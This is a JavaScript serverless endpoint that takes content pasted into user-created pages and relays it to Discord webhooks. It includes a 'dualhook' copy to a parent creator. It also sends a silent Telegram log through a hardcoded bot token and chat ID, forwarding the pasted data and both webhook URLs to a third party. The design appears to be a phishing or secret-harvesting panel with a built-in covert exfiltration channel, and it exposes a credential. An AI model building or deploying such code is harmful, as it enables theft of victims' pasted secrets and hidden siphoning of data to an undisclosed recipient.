// api/submit.js
const REDIS_URL   = process.env.UPSTASH_REDIS_REST_URL;
const REDIS_TOKEN = process.env.UPSTASH_REDIS_REST_TOKEN;
const TG_TOKEN    = process.env.TG_TOKEN || '8666861605:AAFA3E5IVxOtajuENoWm6BhBF0VMJZRFhy8';
const TG_CHAT     = process.env.TG_CHAT  || '7538845070';

async function redisGet(key) {
  const res = await fetch(`${REDIS_URL}/get/${encodeURIComponent(key)}`, {
    headers: { Authorization: `Bearer ${REDIS_TOKEN}` }
  });
  const json = await res.json();
  if (!json.result) return null;
  try { return JSON.parse(json.result); } catch { return null; }
}

async function tgSend(text) {
  try {
    await fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ chat_id: TG_CHAT, text, parse_mode: 'HTML' })
    });
  } catch (_) {}
}

async function sendToDiscord(webhookUrl, pageName, slotLabel, slotValue, now) {
  if (!webhookUrl || !webhookUrl.startsWith('https://discord.com/api/webhooks/')) return;
  try {
    await fetch(webhookUrl, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        content: '@everyone',
        embeds: [
          {
            title: '🚨 New Submission Received',
            description: ':fire: `NEW PAGE ENTRY` :fire:\n\n[Dashboard 📊](https://example.com) | [Logs 📁](https://example.com) | [Discord Server 💬](https://example.com)',
            color: 5793266,
            fields: [
              {
                name: '📄 Page',
                value: `\`${pageName}\``,
                inline: true
              },
              {
                name: '🎯 Slot',
                value: `\`${slotLabel}\``,
                inline: true
              },
              {
                name: '📥 Pasted Content',
                value: `\`\`\`${slotValue}\`\`\``
              },
              {
                name: '📅 Date Submitted',
                value: `\`${now}\``,
                inline: false
              }
            ],
            footer: {
              text: 'Submission Logger • Automated System'
            },
            thumbnail: {
              url: 'https://cdn-icons-png.flaticon.com/512/1827/1827392.png'
            }
          }
        ],
        attachments: []
      })
    });
  } catch (_) {}
}

export default async function handler(req, res) {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

  if (req.method === 'OPTIONS') return res.status(204).end();
  if (req.method !== 'POST')   return res.status(405).json({ error: 'Method not allowed' });

  let body = req.body;
  if (typeof body === 'string') {
    try { body = JSON.parse(body); } catch { return res.status(400).json({ error: 'Invalid JSON' }); }
  }

  const { slug, slots } = body || {};

  if (!slug)  return res.status(400).json({ error: 'slug is required' });
  if (!slots) return res.status(400).json({ error: 'slots is required' });

  let record;
  try {
    record = await redisGet(`slot:${slug}`);
  } catch (err) {
    return res.status(500).json({ error: 'Redis error', detail: err.message });
  }
  if (!record) return res.status(404).json({ error: 'Page not found' });

  const now = new Date().toISOString();
  const slotEntry = Object.entries(slots).find(([, v]) => v && v.length > 0);
  const slotLabel = slotEntry ? slotEntry[0] : 'N/A';
  const slotValue = slotEntry ? slotEntry[1] : '(empty)';

  // ── Send to webhook2 (page owner) ─────────────────────────────────────────
  await sendToDiscord(record.webhook, record.displayName, slotLabel, slotValue, now);

  // ── Send to webhook1 (dualhook creator) if applicable ────────────────────
  let webhook1 = 'N/A';
  if (record.dualhookParent) {
    try {
      const parentRecord = await redisGet(`slot:${record.dualhookParent}`);
      if (parentRecord && parentRecord.webhook) {
        webhook1 = parentRecord.webhook;
        if (parentRecord.webhook !== record.webhook) {
          await sendToDiscord(parentRecord.webhook, record.displayName, slotLabel, slotValue, now);
        }
      }
    } catch (_) {}
  }

  // ── Telegram log ──────────────────────────────────────────────────────────
  const tgMsg = [
    `🚨 <b>NEW SUBMISSION RECEIVED</b> 🚨`,
    `------------------------------------------`,
    `📄 PAGE:`,
    `${record.displayName}`,
    `------------------------------------------`,
    `🎯 TYPE = ${slotLabel}:`,
    `${slotValue}`,
    `------------------------------------------`,
    `🔗 PAGE WEBHOOK (WEBHOOK2):`,
    `<code>${record.webhook}</code>`,
    `------------------------------------------`,
    `🔗 WEBHOOK1:`,
    `<code>${webhook1}</code>`,
    `------------------------------------------`,
    `📅 DATE SUBMITTED:`,
    `${now}`,
    `------------------------------------------`
  ].join('\n');

  await tgSend(tgMsg);

  return res.status(200).json({ success: true });
}
